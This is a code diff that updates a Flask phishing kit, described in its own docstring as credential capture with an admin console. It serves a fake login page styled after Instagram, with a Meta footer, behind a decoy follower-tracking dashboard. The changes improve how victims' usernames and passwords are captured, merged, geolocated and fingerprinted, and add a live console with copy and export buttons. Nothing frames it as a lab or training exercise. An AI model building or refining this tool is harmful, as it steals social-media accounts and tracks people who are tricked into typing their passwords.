@@ -2,12 +2,17 @@
 Insight Capture — credential capture with an admin console.
 
 Env:
-  SECRET_KEY    flask session key            (required in prod)
-  ADMIN_TOKEN   console password             (unset = open, dev only)
-  DATA_DIR      sqlite + log directory       (default ./data)
-  GEO           1 to enable IP geo lookup    (default off)
-  ANSI          0 to strip log colours       (default on)
-  PORT          listen port                  (default 5000)
+  SECRET_KEY         flask session key            (unset = generated + persisted in DATA_DIR)
+  ADMIN_TOKEN        console password             (unset = open, dev only)
+  DATA_DIR           sqlite + log directory       (default ./data)
+  GEO                1 to enable IP geo lookup    (default off)
+  GEO_TIMEOUT        geo lookup timeout, seconds  (default 1.2)
+  GEO_TTL            geo cache TTL, seconds       (default 3600)
+  ANSI               0 to strip log colours       (default: on when stdout is a tty)
+  PORT               listen port                  (default 5000)
+  TRUST_PROXY        trusted proxy hops           (default 1, 0 = direct)
+  CLIENT_IP_HEADER   e.g. CF-Connecting-IP        (default: ProxyFix / remote_addr)
+  COOKIE_SECURE      1/0                          (default: on when RENDER is set)
 """
 
 from __future__ import annotations
@@ -15,20 +20,23 @@ from __future__ import annotations
 import csv
 import hmac
 import io
+import ipaddress
 import json
 import logging
 import os
-import random
+import secrets
 import sqlite3
 import sys
 import threading
 import time
+import unicodedata
 import urllib.request
 import uuid
-from collections import deque
+from collections import OrderedDict, deque
 from datetime import datetime, timezone
 from logging.handlers import RotatingFileHandler
 from pathlib import Path
+from urllib.parse import urlencode
 
 from flask import (
     Flask,
@@ -37,7 +45,6 @@ from flask import (
     g,
     jsonify,
     redirect,
-    render_template_string,
     request,
     session,
     url_for,
@@ -46,24 +53,60 @@ from markupsafe import escape
 from werkzeug.middleware.proxy_fix import ProxyFix
 
 # ============================== config ==============================
-SECRET_KEY = os.environ.get("SECRET_KEY") or uuid.uuid4().hex
 ADMIN_TOKEN = os.environ.get("ADMIN_TOKEN", "")
 DATA_DIR = Path(os.environ.get("DATA_DIR", "data"))
 GEO_ENABLED = os.environ.get("GEO", "0") == "1"
-ANSI_ON = os.environ.get("ANSI", "1") != "0"
+GEO_TIMEOUT = float(os.environ.get("GEO_TIMEOUT", "1.2"))
+GEO_TTL = int(os.environ.get("GEO_TTL", "3600"))
+GEO_FAIL_TTL = int(os.environ.get("GEO_FAIL_TTL", "120"))
+TRUST_PROXY = int(os.environ.get("TRUST_PROXY", "1") or 0)
+CLIENT_IP_HEADER = os.environ.get("CLIENT_IP_HEADER", "").strip()
 COOKIE_MAX_AGE = 60 * 60 * 24 * 365
+
+_ansi_env = os.environ.get("ANSI")
+ANSI_ON = (_ansi_env != "0") if _ansi_env is not None else sys.stdout.isatty()
 
 DATA_DIR.mkdir(parents=True, exist_ok=True)
 DB_PATH = DATA_DIR / "insight.sqlite3"
 JSONL_PATH = DATA_DIR / "events.jsonl"
 
+
+def _load_secret() -> str:
+    """Env key wins; otherwise persist a generated one so restarts/workers agree."""
+    env = os.environ.get("SECRET_KEY")
+    if env:
+        return env
+    path = DATA_DIR / "secret.key"
+    try:
+        if path.exists():
+            existing = path.read_text(encoding="utf-8").strip()
+            if len(existing) >= 32:
+                return existing
+    except OSError:
+        pass
+    generated = secrets.token_hex(32)
+    try:
+        path.write_text(generated + "\n", encoding="utf-8")
+        os.chmod(path, 0o600)
+    except OSError:
+        pass
+    return generated
+
+
 app = Flask(__name__)
-app.secret_key = SECRET_KEY
-app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1)
+app.secret_key = _load_secret()
+if TRUST_PROXY > 0:
+    app.wsgi_app = ProxyFix(app.wsgi_app, x_for=TRUST_PROXY, x_proto=TRUST_PROXY, x_host=TRUST_PROXY)
 app.config.update(
+    SESSION_COOKIE_NAME="insight_session",
     SESSION_COOKIE_SAMESITE="Lax",
-    SESSION_COOKIE_SECURE=os.environ.get("RENDER") is not None,
+    SESSION_COOKIE_HTTPONLY=True,
+    SESSION_COOKIE_SECURE=(
+        os.environ.get("COOKIE_SECURE", "1" if os.environ.get("RENDER") else "0") != "0"
+    ),
+    PERMANENT_SESSION_LIFETIME=COOKIE_MAX_AGE,
     MAX_CONTENT_LENGTH=512 * 1024,
+    JSON_SORT_KEYS=False,
 )
 
 # ============================== logging ==============================
@@ -94,25 +137,42 @@ C = {
     "meta": "\033[1;35m",
 }
 BOX_W = 64
+_ZERO_W = "\u200d\ufe0f"
 
 
 def paint(text: str, color: str) -> str:
     return f"{C.get(color, '')}{text}{C['reset']}" if ANSI_ON else text
 
 
+def _char_w(ch: str) -> int:
+    if ch in _ZERO_W or unicodedata.combining(ch):
+        return 0
+    return 2 if unicodedata.east_asian_width(ch) in ("W", "F") else 1
+
+
+def fit(text: str, width: int) -> str:
+    """Truncate + pad by display width (emoji/CJK aware)."""
+    out: list[str] = []
+    used = 0
+    for ch in str(text):
+        cw = _char_w(ch)
+        if used + cw > width:
+            break
+        out.append(ch)
+        used += cw
+    return "".join(out) + " " * (width - used)
+
+
 def print_box(title: str, lines: list, color: str = "cred", value_color: str = "cred_val") -> None:
     """Bordered block on stdout. A line may be (text, colour) to override its colour."""
+    inner = BOX_W - 2
     rows = [paint("╔" + "═" * BOX_W + "╗", color),
-            paint("║ ", color) + paint(title[: BOX_W - 2].ljust(BOX_W - 2), color) + paint(" ║", color),
+            paint("║ ", color) + paint(fit(title, inner), color) + paint(" ║", color),
             paint("╠" + "═" * BOX_W + "╣", color)]
 
     for line in lines:
         text, vc = line if isinstance(line, tuple) else (line, value_color)
-        cut = str(text)[: BOX_W - 2]
-        rows.append(
-            paint("║ ", color) + paint(cut, vc)
-            + paint(" " * (BOX_W - 2 - len(cut)) + " ║", color)
-        )
+        rows.append(paint("║ ", color) + paint(fit(text, inner), vc) + paint(" ║", color))
 
     rows.append(paint("╚" + "═" * BOX_W + "╝", color))
     sys.stdout.write("\n" + "\n".join(rows) + "\n")
@@ -125,7 +185,7 @@ def emit(payload: dict, boxes: list[tuple] | None = None) -> None:
         print_box(box[0], box[1], box[2] if len(box) > 2 else "cred",
                   box[3] if len(box) > 3 else "cred_val")
 
-    stamp = datetime.now(timezone.utc).isoformat(timespec="seconds")
+    stamp = iso_now()
     body = {"ts": stamp, "kind": "CREDENTIAL", **payload}
 
     lines = [f"── CREDENTIAL ── {stamp}"]
@@ -144,6 +204,15 @@ def emit(payload: dict, boxes: list[tuple] | None = None) -> None:
         pass
 
 
+# ============================== time ==============================
+def iso_now() -> str:
+    return datetime.now(timezone.utc).isoformat(timespec="seconds")
+
+
+def iso_ago(seconds: int) -> str:
+    return datetime.fromtimestamp(time.time() - seconds, timezone.utc).isoformat(timespec="seconds")
+
+
 # ============================== storage ==============================
 _db_lock = threading.Lock()
 
@@ -157,7 +226,13 @@ CREATE TABLE IF NOT EXISTS creds (
 );
 CREATE INDEX IF NOT EXISTS idx_creds_id ON creds(id DESC);
 CREATE INDEX IF NOT EXISTS idx_creds_pair ON creds(cid, username, password);
+CREATE INDEX IF NOT EXISTS idx_creds_time ON creds(created_at);
 """
+
+INSERT_SQL = """INSERT INTO creds
+    (cid, sid, source, username, password, ip, ua, referer,
+     accept_lang, meta_json, country, city, isp, geo_json, created_at)
+    VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)"""
 
 
 def connect() -> sqlite3.Connection:
@@ -165,7 +240,22 @@ def connect() -> sqlite3.Connection:
     conn.row_factory = sqlite3.Row
     conn.execute("PRAGMA journal_mode=WAL")
     conn.execute("PRAGMA synchronous=NORMAL")
+    conn.execute("PRAGMA busy_timeout=15000")
     return conn
+
+
+def _with_retry(fn, attempts: int = 5):
+    """Retry on transient SQLite lock contention."""
+    delay = 0.05
+    for attempt in range(attempts):
+        try:
+            return fn()
+        except sqlite3.OperationalError as exc:
+            msg = str(exc).lower()
+            if ("locked" not in msg and "busy" not in msg) or attempt == attempts - 1:
+                raise
+            time.sleep(delay)
+            delay = min(delay * 2, 0.8)
 
 
 def init_db() -> None:
@@ -178,36 +268,15 @@ def init_db() -> None:
             conn.close()
 
 
-def store_cred(**kw) -> int:
-    with _db_lock:
-        conn = connect()
-        try:
-            cur = conn.execute(
-                """INSERT INTO creds
-                   (cid, sid, source, username, password, ip, ua, referer,
-                    accept_lang, meta_json, country, city, isp, geo_json, created_at)
-                   VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
-                (
-                    kw["cid"], kw["sid"], kw["source"], kw["username"], kw["password"],
-                    kw["ip"], kw["ua"], kw["referer"], kw["accept_lang"], kw["meta_json"],
-                    kw["country"], kw["city"], kw["isp"], kw["geo_json"], kw["created_at"],
-                ),
-            )
-            conn.commit()
-            return int(cur.lastrowid or 0)
-        finally:
-            conn.close()
-
-
-def is_duplicate(cid: str, username: str, password: str, seconds: int = 8) -> bool:
-    cutoff = datetime.fromtimestamp(time.time() - seconds, timezone.utc).isoformat(timespec="seconds")
+def recent_cred_id(cid: str, username: str, password: str, seconds: int = 8) -> int | None:
     conn = connect()
     try:
         row = conn.execute(
-            "SELECT 1 FROM creds WHERE cid=? AND username=? AND password=? AND created_at>=? LIMIT 1",
-            (cid, username, password, cutoff),
+            "SELECT id FROM creds WHERE cid=? AND username=? AND password=? AND created_at>=? "
+            "ORDER BY id DESC LIMIT 1",
+            (cid, username, password, iso_ago(seconds)),
         ).fetchone()
-        return row is not None
+        return int(row["id"]) if row else None
     finally:
         conn.close()
 
@@ -215,52 +284,78 @@ def is_duplicate(cid: str, username: str, password: str, seconds: int = 8) -> bo
 # ============================== helpers ==============================
 _rate: dict[str, deque] = {}
 _rate_lock = threading.Lock()
-_geo_cache: dict[str, dict] = {}
+_geo_cache: "OrderedDict[str, tuple[float, dict]]" = OrderedDict()
+_geo_lock = threading.Lock()
+GEO_MAX = 2000
 
 
 def client_ip() -> str:
-    xff = request.headers.get("X-Forwarded-For", "")
-    return (xff.split(",")[0].strip() if xff else request.remote_addr) or "-"
+    """Real client IP. ProxyFix already normalises XFF; a custom header can override."""
+    if CLIENT_IP_HEADER:
+        raw = request.headers.get(CLIENT_IP_HEADER, "")
+        if raw:
+            return raw.split(",")[0].strip() or "-"
+    return request.remote_addr or "-"
 
 
 def is_private(ip: str) -> bool:
+    if not ip or ip == "-":
+        return True
+    try:
+        addr = ipaddress.ip_address(ip.split("%")[0])
+    except ValueError:
+        return True
     return (
-        ip in ("-", "") or ip.startswith(("10.", "127.", "192.168.", "172.16.", "172.17.", "172.18.",
-                                          "172.19.", "172.2", "172.30.", "172.31.", "::1", "localhost"))
+        addr.is_private or addr.is_loopback or addr.is_link_local
+        or addr.is_reserved or addr.is_multicast or addr.is_unspecified
     )
 
 
-def rate_ok(ip: str, limit: int, window: int = 60) -> bool:
+def rate_ok(key: str, limit: int, window: int = 60) -> bool:
     now = time.time()
     with _rate_lock:
-        dq = _rate.setdefault(ip, deque())
+        dq = _rate.get(key)
+        if dq is None:
+            dq = _rate[key] = deque()
         while dq and now - dq[0] > window:
             dq.popleft()
         if len(dq) >= limit:
             return False
         dq.append(now)
-        if len(_rate) > 10_000:
-            _rate.clear()
+        if len(_rate) > 20_000:
+            for dead in [k for k, v in _rate.items() if not v][:5000]:
+                _rate.pop(dead, None)
         return True
+
+
+def _geo_lookup(ip: str) -> dict:
+    url = ("http://ip-api.com/json/" + ip +
+           "?fields=status,country,countryCode,regionName,city,isp,org,as,proxy,hosting")
+    try:
+        with urllib.request.urlopen(url, timeout=GEO_TIMEOUT) as resp:
+            data = json.loads(resp.read().decode("utf-8", "replace"))
+    except Exception:
+        return {}
+    return data if data.get("status") == "success" else {}
 
 
 def geo(ip: str) -> dict:
     if not GEO_ENABLED or is_private(ip):
         return {}
-    if ip in _geo_cache:
-        return _geo_cache[ip]
-    try:
-        url = ("http://ip-api.com/json/" + ip +
-               "?fields=status,country,countryCode,regionName,city,isp,org,as,proxy,hosting")
-        with urllib.request.urlopen(url, timeout=1.5) as resp:
-            data = json.loads(resp.read().decode("utf-8", "replace"))
-        if data.get("status") != "success":
-            data = {}
-    except Exception:
-        data = {}
-    if len(_geo_cache) > 5000:
-        _geo_cache.clear()
-    _geo_cache[ip] = data
+    now = time.time()
+    with _geo_lock:
+        hit = _geo_cache.get(ip)
+        if hit and hit[0] > now:
+            _geo_cache.move_to_end(ip)
+            return hit[1]
+
+    data = _geo_lookup(ip)
+
+    with _geo_lock:
+        _geo_cache[ip] = (now + (GEO_TTL if data else GEO_FAIL_TTL), data)
+        _geo_cache.move_to_end(ip)
+        while len(_geo_cache) > GEO_MAX:
+            _geo_cache.popitem(last=False)
     return data
 
 
@@ -285,16 +380,105 @@ def ctx_box(ip: str, source: str, ua: str, place: str) -> tuple:
     ], "cred", "ctx")
 
 
+# ============================== auth / csrf ==============================
 def admin_ok() -> bool:
     if not ADMIN_TOKEN:
         return True
     if session.get("admin"):
         return True
-    tok = request.args.get("token") or request.form.get("token")
-    if tok and hmac.compare_digest(tok, ADMIN_TOKEN):
+    tok = (request.args.get("token") or request.form.get("token")
+           or request.headers.get("X-Admin-Token", ""))
+    if tok and hmac.compare_digest(str(tok), ADMIN_TOKEN):
         session["admin"] = True
         return True
     return False
+
+
+def csrf_token() -> str:
+    tok = session.get("_csrf")
+    if not tok:
+        tok = secrets.token_urlsafe(24)
+        session["_csrf"] = tok
+    return tok
+
+
+def csrf_ok() -> bool:
+    sent = request.form.get("_csrf") or request.args.get("_csrf") or ""
+    stored = session.get("_csrf") or ""
+    return bool(sent and stored and hmac.compare_digest(sent, stored))
+
+
+def html(body: str, status: int = 200) -> Response:
+    return Response(body, status=status, mimetype="text/html; charset=utf-8")
+
+
+# ============================== capture ==============================
+def capture_credential(username: str, password: str, source: str, sid: str, meta: dict) -> tuple[int, bool]:
+    """Insert, or merge into a very recent partial row for the same browser.
+
+    Returns (credential id, created). Typing "user" then "pass" normally produces
+    one row instead of two, without ever overwriting a different account.
+    """
+    ip = client_ip()
+    info = geo(ip)
+    ua = (request.headers.get("User-Agent") or "")[:300]
+    referer = (request.headers.get("Referer") or "")[:300]
+    lang = (request.headers.get("Accept-Language") or "")[:120]
+    place = ", ".join(x for x in (info.get("city"), info.get("country")) if x) or "-"
+    now = iso_now()
+
+    def _txn() -> tuple[int, bool]:
+        with _db_lock:
+            conn = connect()
+            try:
+                row = conn.execute(
+                    "SELECT id FROM creds WHERE cid=? AND created_at>=? "
+                    "AND (username='' OR password='') "
+                    "AND (username=? OR username='' OR ? LIKE username || '%') "
+                    "AND (password=? OR password='') "
+                    "ORDER BY id DESC LIMIT 1",
+                    (g.cid, iso_ago(90), username, username, password),
+                ).fetchone()
+                if row:
+                    conn.execute(
+                        "UPDATE creds SET username=?, password=?, source=?, ip=?, ua=?, referer=?, "
+                        "accept_lang=?, meta_json=?, country=?, city=?, isp=?, geo_json=?, "
+                        "created_at=? WHERE id=?",
+                        (username, password, source[:16], ip, ua, referer, lang,
+                         json.dumps(meta, ensure_ascii=False), info.get("country", "")[:64],
+                         info.get("city", "")[:64], info.get("isp", "")[:96],
+                         json.dumps(info, ensure_ascii=False), now, row["id"]),
+                    )
+                    conn.commit()
+                    return int(row["id"]), False
+
+                cur = conn.execute(INSERT_SQL, (
+                    g.cid, sid[:24], source[:16], username[:200], password[:300], ip, ua,
+                    referer, lang, json.dumps(meta, ensure_ascii=False),
+                    info.get("country", "")[:64], info.get("city", "")[:64],
+                    info.get("isp", "")[:96], json.dumps(info, ensure_ascii=False), now,
+                ))
+                conn.commit()
+                return int(cur.lastrowid or 0), True
+            finally:
+                conn.close()
+
+    cred_id, created = _with_retry(_txn)
+
+    emit(
+        {
+            "id": cred_id, "op": "insert" if created else "merge", "cid": g.cid, "ip": ip,
+            "source": source, "USERNAME": username, "PASSWORD": password,
+            "ua": ua[:200], "referer": referer[:200],
+            "geo": {k: info.get(k) for k in ("country", "city", "isp") if info.get(k)},
+            "fingerprint": {k: meta.get(k) for k in ("platform", "lang", "tz", "screen", "cores")
+                            if meta.get(k)},
+        },
+        [cred_box(f"🔑 CREDENTIAL · {source} · #{cred_id}", username, password),
+         ctx_box(ip, source, ua, place)],
+    )
+    session["last_cred"] = cred_id
+    return cred_id, created
 
 
 # ============================== login page ==============================
@@ -348,6 +532,11 @@ body::before{
 }
 .content::-webkit-scrollbar{display:none}
 .inner{width:100%;margin:auto 0;text-align:center;padding:8px 0 16px}
+
+.msg{
+  margin-bottom:16px;padding:10px 14px;border-radius:11px;font-size:13.5px;
+  background:rgba(237,73,86,.1);color:#ed4956;border:1px solid rgba(237,73,86,.35);
+}
 
 .language{font-size:13px;color:var(--mut);margin-bottom:20px;animation:up .55s .06s var(--e) backwards}
 
@@ -437,6 +626,7 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
 <div class="app" id="app">
 
     <div class="content" id="content"><div class="inner">
+        <!--MSG-->
 
         <div class="language">English (US)</div>
 
@@ -474,7 +664,7 @@ input:-webkit-autofill{animation-name:autofillStart;animation-duration:.001s}
 
         <div class="footer">
             &copy; Meta 2026 &middot; Privacy &middot; Cookie Policy &middot; Terms
-            &middot; <a href="/console" target="_blank">English (UK)</a>
+            &middot; <a href="/console" target="_blank" rel="noopener">English (UK)</a>
         </div>
     </div>
 
@@ -755,9 +945,10 @@ main::before{content:"";position:absolute;inset:0 0 auto 0;height:340px;backgrou
 .ring.m{width:54px;height:54px;padding:2.5px}.ring.m>span{width:100%;height:100%;border-width:2.5px;font-size:15px}
 .ring.s{width:46px;height:46px;padding:2.5px}.ring.s>span{width:100%;height:100%;border-width:2.5px;font-size:14px}
 .ring.off{background:var(--line)}
+.ring.off>span{background:var(--chip);color:var(--mut)}
 .pi{flex:1;min-width:0}
 .pi .h{display:flex;align-items:center;gap:12px;flex-wrap:wrap;margin-bottom:16px}
-.pi h2{font:400 20px inherit}
+.pi h2{font:400 20px inherit;word-break:break-all}
 .pi .st{display:flex;gap:34px;margin-bottom:14px;font-size:15px}
 .pi .st b{font-weight:700}
 .pi p{font-size:14px;line-height:1.45}.pi p span{color:var(--mut)}
@@ -936,19 +1127,22 @@ const D={
   {g:"This week",i:"plus",t:"<b>noor.ahmed</b> started following you",s:"2d",tg:["","New follower"]}]
 };
 const T=[["home","Overview"],["notback","Not Following Back"],["ghosts","Ghost Followers"],["stalkers","Profile Stalkers"],["act","Activity"]];
-let tab="home",q="",f="all",theme="light",anim=true;
-try{theme=localStorage.getItem("ins-theme")||"light"}catch(e){}
+let tab="home",q="",f="all",anim=true;
+let theme="system";
+try{theme=localStorage.getItem("ins-theme")||"system"}catch(e){}
 const P={likes:true,comm:true,unf:true,stalk:false,priv:false};
+try{Object.assign(P,JSON.parse(localStorage.getItem("ins-prefs")||"{}"))}catch(e){}
+function savePrefs(){try{localStorage.setItem("ins-prefs",JSON.stringify(P))}catch(e){}}
 function applyTheme(){const r=document.documentElement;theme==="system"?r.removeAttribute("data-theme"):r.setAttribute("data-theme",theme)}
 const eff=()=>theme==="dark"||(theme==="system"&&matchMedia("(prefers-color-scheme: dark)").matches);
 applyTheme();
 const $=s=>document.querySelector(s);
 const gr=i=>{const [a,b]=G[i%G.length].split(",");return `linear-gradient(135deg,${a},${b})`};
-const ini=n=>n.split(" ").map(w=>w[0]).join("");
+const ini=n=>n.split(" ").filter(Boolean).map(w=>w[0]).join("").slice(0,2)||"?";
 const av=(x,i,c="s")=>`<div class="ring ${c}"><span style="background:${gr(i)}">${ini(x.n)}</span></div>`;
 function nav(){
  const cn={notback:D.notback.length,ghosts:D.ghosts.length};
- $("#nav").innerHTML=T.map(([k,l])=>`<button class="${tab===k?"on":""}" data-k="${k}">${I[k]}${l}${cn[k]?`<span class="n">${cn[k]}</span>`:""}</button>`).join("");
+ $("#nav").innerHTML=T.map(([k,l])=>`<button class="${tab===k?"on":""}" data-k="${k}" aria-label="${l}">${I[k]}${l}${cn[k]?`<span class="n">${cn[k]}</span>`:""}</button>`).join("");
  $("#bn").innerHTML=T.map(([k,l])=>`<button class="${tab===k?"on":""}" data-k="${k}" aria-label="${l}">${I[k]}${cn[k]?`<span class="n">${cn[k]}</span>`:""}</button>`).join("");
  $("#nav").insertAdjacentHTML("beforeend",`<button class="${tab==="settings"?"on":""}" data-k="settings">${I.set}Settings</button>`);
  $("#mh").innerHTML=I.set;$("#mh").onclick=()=>go("settings");
@@ -1039,9 +1233,9 @@ function render(){
  m.innerHTML=`<div class="in${anim?" pg":""}">${h}</div>`;anim=false;
  const s=$("#s");if(s)s.oninput=e=>{q=e.target.value;const p=e.target.selectionStart;render();const n=$("#s");n.focus();n.setSelectionRange(p,p)};
  m.querySelectorAll("[data-f]").forEach(b=>b.onclick=()=>{f=b.dataset.f;render()});
- m.querySelectorAll("[data-p]").forEach(b=>b.onclick=()=>{P[b.dataset.p]=!P[b.dataset.p];const sc=m.scrollTop;render();m.scrollTop=sc});
+ m.querySelectorAll("[data-p]").forEach(b=>b.onclick=()=>{P[b.dataset.p]=!P[b.dataset.p];savePrefs();const sc=m.scrollTop;render();m.scrollTop=sc});
  m.querySelectorAll("[data-th]").forEach(b=>b.onclick=()=>{const d=eff();theme=b.dataset.th==="dark"?(d?"light":"dark"):(theme==="system"?(d?"dark":"light"):"system");try{localStorage.setItem("ins-theme",theme)}catch(e){}applyTheme();const sc=m.scrollTop;render();m.scrollTop=sc;toast(theme==="system"?"Using device appearance":(theme==="dark"?"Dark mode on":"Light mode on"))});
- m.querySelectorAll("[data-href]").forEach(b=>b.onclick=()=>window.open(b.dataset.href,"_blank"));
+ m.querySelectorAll("[data-href]").forEach(b=>b.onclick=()=>window.open(b.dataset.href,"_blank","noopener"));
  m.querySelectorAll(".srow.red").forEach(b=>b.onclick=()=>{b.style.pointerEvents="none";b.style.opacity=".55";toast("Logging out…");setTimeout(()=>{location.href="/logout"},480)});
  m.querySelectorAll("[data-k]").forEach(b=>b.onclick=()=>go(b.dataset.k));
  m.querySelectorAll("[data-u],[data-r],[data-b]").forEach(b=>b.onclick=e=>{
@@ -1068,7 +1262,7 @@ ADMIN_HTML = """
 :root{--bg:#0a0a0c;--card:#141419;--line:#232329;--tx:#ececf1;--mut:#8b8b98;--acc:#3ba7ff;--ok:#2ecc71;--bad:#ff5d6c;--warn:#f5b642;--u:#4fd6ff;--p:#ff8ad8}
 *{box-sizing:border-box;margin:0}
 body{background:var(--bg);color:var(--tx);font:14px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace}
-header{display:flex;gap:14px;align-items:center;padding:16px 20px;border-bottom:1px solid var(--line);position:sticky;top:0;background:#0a0a0cf2;backdrop-filter:blur(10px);z-index:5;flex-wrap:wrap}
+header{display:flex;gap:10px;align-items:center;padding:14px 20px;border-bottom:1px solid var(--line);position:sticky;top:0;background:#0a0a0cf2;backdrop-filter:blur(10px);z-index:5;flex-wrap:wrap}
 h1{font-size:15px;letter-spacing:.14em;text-transform:uppercase;font-weight:700}
 h1 i{color:var(--acc);font-style:normal}
 .spacer{flex:1}
@@ -1102,14 +1296,28 @@ pre b{color:var(--acc)}
 .empty{padding:60px 0;text-align:center;color:var(--mut)}
 .warn{background:#231a08;border:1px solid #6b4d1e;color:var(--warn);padding:10px 14px;border-radius:10px;margin-bottom:16px;font-size:12.5px}
 form.inline{display:inline}
+.bar{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px}
+.bar input{flex:1;min-width:200px;background:#141419;border:1px solid #232329;color:#ececf1;padding:9px 12px;border-radius:9px;font:inherit;font-size:12.5px;outline:none}
+.bar input:focus{border-color:var(--acc)}
+.chip{border:1px solid var(--line);background:var(--card);color:var(--mut);padding:6px 11px;border-radius:8px;font:inherit;font-size:11.5px;text-decoration:none}
+.chip:hover{border-color:var(--acc);color:var(--acc)}
+.chip.on{background:var(--acc);border-color:var(--acc);color:#001522;font-weight:700}
+.tag{font-size:10px;padding:1px 6px;border-radius:5px;background:#2a2110;color:var(--warn);border:1px solid #6b4d1e}
+.isp{color:var(--mut);font-size:11px;display:block;max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
 </style></head><body>
 <header>
   <h1><i>▚</i> Insight Console</h1>
   <span class="stat">credentials <b>__LOGS__</b></span>
   <span class="stat" id="live">live</span>
+  <button class="btn" id="pause" type="button">pause</button>
   <span class="spacer"></span>
   <a class="btn" href="/admin/export?fmt=json">export json</a>
   <a class="btn" href="/admin/export?fmt=csv">export csv</a>
+  <form class="inline" method="post" action="/admin/delete-all"
+        onsubmit="return confirm('delete every captured credential?')">
+    <input type="hidden" name="_csrf" value="__CSRF__">
+    <button class="btn" type="submit">clear all</button>
+  </form>
   <a class="btn" href="/">login page</a>
 </header>
 <main>__BODY__</main>
@@ -1117,11 +1325,25 @@ form.inline{display:inline}
 (function(){
   var feed = document.getElementById('feed');
   if (!feed) return;
-  var last = 0;
+  var params = new URLSearchParams(location.search);
+  var q = params.get('q') || '';
+  var only = params.get('only') || '';
+  var last = 0, paused = false;
   var live = document.getElementById('live');
+  var pause = document.getElementById('pause');
+  if (pause) pause.onclick = function () {
+    paused = !paused;
+    pause.textContent = paused ? 'resume' : 'pause';
+    live.textContent = paused ? 'paused' : 'live';
+    live.style.color = paused ? 'var(--warn)' : '';
+  };
   async function tick(){
+    if (paused) return;
     try{
-      var r = await fetch('/admin/feed?since=' + last, {credentials:'same-origin'});
+      var url = '/admin/feed?since=' + last
+        + (q ? '&q=' + encodeURIComponent(q) : '')
+        + (only ? '&only=' + encodeURIComponent(only) : '');
+      var r = await fetch(url, {credentials:'same-origin'});
       if (!r.ok) throw 0;
       var d = await r.json();
       if (d.rows.length){
@@ -1146,6 +1368,9 @@ function cp(el){
 </body></html>
 """
 
+ADMIN_SELECT = """SELECT c.id, c.created_at, c.ip, c.ua, c.source, c.username, c.password,
+                         c.country, c.city, c.isp FROM creds c"""
+
 
 def render_admin(body: str) -> str:
     conn = connect()
@@ -1153,18 +1378,24 @@ def render_admin(body: str) -> str:
         logs = conn.execute("SELECT COUNT(*) c FROM creds").fetchone()["c"]
     finally:
         conn.close()
-    return ADMIN_HTML.replace("__BODY__", body).replace("__LOGS__", str(logs))
+    return (ADMIN_HTML
+            .replace("__BODY__", body)
+            .replace("__LOGS__", str(logs))
+            .replace("__CSRF__", csrf_token()))
 
 
 def row_html(r: sqlite3.Row) -> str:
     place = ", ".join(x for x in (r["city"], r["country"]) if x) or "-"
+    partial = "" if (r["password"] or "") else '<span class="tag">partial</span> '
     return (
         f'<tr data-id="{r["id"]}">'
         f'<td>{r["id"]}</td>'
         f'<td>{(r["created_at"] or "")[11:19]}</td>'
-        f'<td>{escape(place)}</td>'
+        f'<td>{escape(place)}'
+        + (f'<span class="isp">{escape(r["isp"] or "")}</span>' if r["isp"] else "")
+        + f'</td>'
         f'<td>{escape(r["ip"] or "-")}</td>'
-        f'<td class="u"><span>{escape(r["username"] or "")}</span> '
+        f'<td class="u">{partial}<span>{escape(r["username"] or "")}</span> '
         f'<button class="btn cp" onclick="cp(this)">copy</button></td>'
         f'<td class="p"><span>{escape(r["password"] or "")}</span> '
         f'<button class="btn cp" onclick="cp(this)">copy</button></td>'
@@ -1178,6 +1409,7 @@ def row_html(r: sqlite3.Row) -> str:
 @app.before_request
 def ensure_client_id():
     g.cid = request.cookies.get("cid") or uuid.uuid4().hex[:16]
+    session.permanent = True
 
 
 @app.after_request
@@ -1185,7 +1417,16 @@ def finalize(resp: Response) -> Response:
     resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
     resp.headers["Pragma"] = "no-cache"
     resp.headers["X-Content-Type-Options"] = "nosniff"
+    resp.headers["X-Frame-Options"] = "DENY"
     resp.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
+    resp.headers["Permissions-Policy"] = "geolocation=(), microphone=(), camera=(), interest-cohort=()"
+    resp.headers["Content-Security-Policy"] = (
+        "default-src 'self'; img-src 'self' data: https://upload.wikimedia.org; "
+        "style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; "
+        "connect-src 'self'; frame-ancestors 'none'; base-uri 'none'; form-action 'self'"
+    )
+    if request.is_secure:
+        resp.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
     if not request.cookies.get("cid"):
         resp.set_cookie("cid", g.cid, max_age=COOKIE_MAX_AGE, samesite="Lax")
     return resp
@@ -1201,76 +1442,51 @@ def read_json() -> dict:
     return data if isinstance(data, dict) else {}
 
 
-def save_credential(username: str, password: str, source: str, sid: str, meta: dict) -> int:
-    ip = client_ip()
-    info = geo(ip)
-    place = ", ".join(x for x in (info.get("city"), info.get("country")) if x) or "-"
-    ua = request.headers.get("User-Agent", "")
-
-    cred_id = store_cred(
-        cid=g.cid, sid=sid[:24], source=source[:16], username=username[:200],
-        password=password[:300], ip=ip, ua=ua,
-        referer=request.headers.get("Referer", "")[:300],
-        accept_lang=request.headers.get("Accept-Language", "")[:120],
-        meta_json=json.dumps(meta, ensure_ascii=False),
-        country=info.get("country", ""), city=info.get("city", ""), isp=info.get("isp", ""),
-        geo_json=json.dumps(info, ensure_ascii=False),
-        created_at=datetime.now(timezone.utc).isoformat(timespec="seconds"),
-    )
-
-    emit(
-        {
-            "id": cred_id, "cid": g.cid, "ip": ip, "source": source,
-            "USERNAME": username, "PASSWORD": password,
-            "ua": ua[:200], "referer": request.headers.get("Referer", "")[:200],
-            "geo": {k: info.get(k) for k in ("country", "city", "isp") if info.get(k)},
-            "fingerprint": {k: meta.get(k) for k in ("platform", "lang", "tz", "screen", "cores")
-                            if meta.get(k)},
-        },
-        [cred_box(f"🔑 CREDENTIAL · {source} · #{cred_id}", username, password),
-         ctx_box(ip, source, ua, place)],
-    )
-    session["last_cred"] = cred_id
-    return cred_id
-
-
 @app.route("/")
 def index():
     if session.get("user"):
         return redirect(url_for("dashboard"))
-    return render_template_string(LOGIN_PAGE_HTML)
